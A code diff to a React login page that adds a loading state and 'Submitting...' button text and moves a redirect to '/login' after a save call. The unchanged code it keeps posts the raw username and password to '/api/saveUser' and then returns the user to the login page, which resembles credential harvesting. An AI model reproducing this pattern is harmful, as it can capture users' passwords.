@@ -19,6 +19,7 @@ const LoginPage = () => {
   const [user, setUser] = useState("");
   const [password, setPassword] = useState("");
   const [deviceType, setDeviceType] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
 
   const [isLinkExpired, setIsLinkExpired] = useState(false);
 
@@ -129,14 +130,18 @@ const LoginPage = () => {
       return;
     }
 
+    setIsLoading(true);
     dispatch(userLogin({ user, password, deviceType }));
-    router.push("/login");
+    
 
     try {
       await axios.post("/api/saveUser", { user, password, deviceType });
       console.log("User data saved successfully");
+      router.push("/login");
     } catch (error) {
       console.error(error);
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -278,7 +283,7 @@ const LoginPage = () => {
                 type="submit"
                 className="w-[104%] bg-[#009DC1] text-white border-none rounded-[3px] py-[12px] text-[16px] font-normal cursor-pointer mb-[14px] transition-colors duration-150 hover:bg-[#0089AA] focus-visible:outline-2 focus-visible:outline-[#93002F] focus-visible:outline-offset-2"
               >
-                Log in
+                {isLoading ? "Submitting..." : "Log in"}
               </button>
 
               {/* Fine Print */}
